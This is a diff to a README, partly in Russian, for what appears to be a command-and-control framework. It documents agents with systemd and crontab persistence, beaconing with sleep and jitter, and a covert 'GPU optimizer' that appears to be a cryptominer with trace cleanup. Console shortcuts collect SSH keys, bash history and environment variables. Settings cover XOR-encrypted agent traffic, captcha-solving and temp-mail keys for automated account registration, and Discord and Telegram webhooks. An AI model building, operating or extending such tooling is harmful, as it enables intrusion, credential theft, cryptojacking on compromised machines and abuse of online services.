@@ -138,12 +138,32 @@ All agents use `http://CHANGE_ME:443` as a placeholder. When served via `GET /ag
 | `persist_systemd` | Install systemd service (Linux) |
 | `kill` | Terminate agent and remove persistence |
 
-### Console Shortcuts
-Type these in any agent console:
-- `:start` — deploy GPU optimizer
-- `:sysinfo` — run sysinfo task
-- `:ps` — list processes
-- `:net` — network info
+### Console Shortcuts (Beacon Dynamic Sleep)
+Beacon response now returns `sleep` and `jitter` from DB per-agent — agents auto-update their interval without restart.
+
+Type these in any agent console (cmd type, or click buttons in Shortcuts sidebar):
+
+**GPU Optimizer:**
+- `:start` — установить и запустить GPU optimizer
+- `:status` — статус optimizer
+- `:log` — лог optimizer (последние 50 строк)
+- `:persist` — запуск + добавить в crontab
+- `:stop` — остановить optimizer
+- `:cleanup` — удалить все следы
+
+**Сбор информации:**
+- `:sysinfo` — полная информация о системе
+- `:id` — whoami + hostname
+- `:ps` — список процессов по CPU
+- `:net` — сетевые интерфейсы + маршруты
+- `:ports` — открытые порты
+- `:env` — переменные окружения
+- `:gpu` — информация о GPU
+- `:cwd` — текущая директория + ls
+- `:history` — история bash
+- `:cron` — crontab
+- `:ssh` — SSH ключи / known_hosts
+- `:uptime` — uptime + кто залогинен
 
 ---
 
@@ -157,12 +177,17 @@ The payloads page provides ready-to-use one-liners for every platform. The serve
 ### Key Config Values (Settings page)
 | Key | Description |
 |-----|-------------|
-| `public_url` | Public URL for tunnels/external access |
-| `agent_token` | Auth token injected into served agent scripts |
-| `encryption_key` | XOR encryption key for agent comms |
-| `cloudflare_tunnel_token` | Cloudflare tunnel token |
-| `captcha_api_key` | 2captcha API key |
-| `boomlify_api_keys` | Temp email API keys (comma-separated) |
+| `public_url` | Public URL для туннелей/внешнего доступа |
+| `agent_token` | Auth токен — агенты должны отправлять в X-Auth-Token |
+| `encryption_key` | XOR ключ шифрования agent ↔ server трафика |
+| `cloudflare_tunnel_token` | Cloudflare named tunnel token |
+| `captcha_api_key` | CapMonster/Anti-Captcha API ключ (для авторегистрации) |
+| `boomlify_api_keys` | Boomlify API ключи (по строке) — для temp mail |
+| `fcb_api_keys` | FCaptcha API ключи (по строке) |
+| `webhook_discord` | Discord webhook URL для нотификаций |
+| `webhook_telegram` | Telegram bot URL для нотификаций |
+
+Ключи captcha/mail автоматически синхронизируются в env vars и `data/*.txt` при сохранении и при запуске сервера.
 
 ### Environment Variables (`.env`)
 ```bash
